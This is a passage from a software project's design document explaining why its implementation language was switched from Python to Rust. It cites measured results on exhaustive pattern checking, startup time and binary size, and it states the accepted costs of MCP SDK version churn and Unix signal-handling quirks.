| Build order | **Greenfield repo, Chariot last** | Isolation requested; keeps Chariot's merge gate out of the blast radius. |

### 10.1 Why the language was reopened, and what decided it

This row previously read **Python**, on two grounds. Both were written before decisions that
invalidated them, which is why it was reopened rather than relitigated.

| Original ground | What happened to it |
|---|---|
| *"Keeps 6,169 working lines, plus the test suite"* | **Void.** §2.7 of `ARCHITECTURE.md` made phase 3 a clean-room rewrite and forbade the harvest document from carrying implementation. Zero lines transfer regardless of language. |
| *"The language was never the requirement"* | True — and it argues the choice is *free*, not that Python is right. |

A third assumption also failed: the owner is not a Python developer, so familiarity favoured
nothing. With every original ground gone, the decision was made on measured properties.

**What decided it.** The same reducer was written in four languages, an `Event` variant added,
and left unhandled:

| | Result |
|---|---|
| **Rust** | `error[E0004]: non-exhaustive patterns` — unconditionally |
| TypeScript, Python + mypy strict | Caught only via return-type pressure; a `void`/`None` reducer compiles clean |
| Go | `build` and `vet` both pass. The event is **silently dropped** |

`ARCHITECTURE.md` §1.2 spends a page establishing that the scheduler must be a reducer because
a deadlock there is the one bug class greenfield development structurally cannot catch, and `ARCHITECTURE.md` §1.2
establishes those types as the scheduler's specification. Only one candidate can hold that
specification in the type system.

Supporting, all measured: 4.8 ms cold start against Python's 116 ms; a ~2 MB static binary
against a ~108 MB Python install; `TransactionBehavior::Immediate` as a typed argument rather
than a driver-specific DSN string; newtypes that make `workspace_id` and `project_id`
unconfusable when both are 8-character hex; and `rmcp` is the only MCP SDK shipping the Tasks
extension.

**The cost accepted, stated plainly.** `rmcp` released three major versions in five months —
v1.0.0 in March, v2.0.0 in June, v3.0.0 in July, one month apart. Go's SDK has had no breaking
major since September 2025. That churn is real and ongoing.

It is accepted because the blast radius is bounded **by decisions already made**: §7 makes a
growing MCP surface a non-goal, and §1.3 of `ARCHITECTURE.md` means the MCP server calls the
same core functions the CLI does. A breaking `rmcp` release therefore hits one adapter module
behind a protocol boundary — never the core, the scheduler, or the CLI. Pin the version;
upgrade deliberately.

Two further costs go in [`traps.md`](traps.md) as rules, because both sit in machinery §7 calls
load-bearing: Rust sets `SIGPIPE` to `SIG_IGN` at startup, so `char status | head` panics until
fixed; and `setsid` is not in `std`, so detaching a process group needs `unsafe pre_exec`.

**Do not reopen this again without new measured evidence.** It has been examined twice, by
independent analyses reaching the same conclusion from different reasoning.

---

## 11. Risks

> **Moved to [`PHASES.md`](PHASES.md).**

---

## 12. Notes for the implementing agent

> **Moved to [`PHASES.md`](PHASES.md).**
